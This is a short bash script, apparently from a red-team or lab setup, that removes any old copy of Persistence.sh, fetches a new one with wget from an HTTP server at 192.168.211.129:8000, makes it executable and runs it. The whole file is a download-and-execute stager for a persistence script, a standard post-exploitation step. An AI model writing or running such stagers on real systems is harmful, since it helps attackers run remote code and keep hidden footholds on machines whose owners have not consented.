#! /bin/bash

[ -f Persistence.sh ] && rm Persistence.sh

wget http://192.168.211.129:8000/Downloads/Scripts/Persistence.sh

chmod +x ./Persistence.sh 

./Persistence.sh
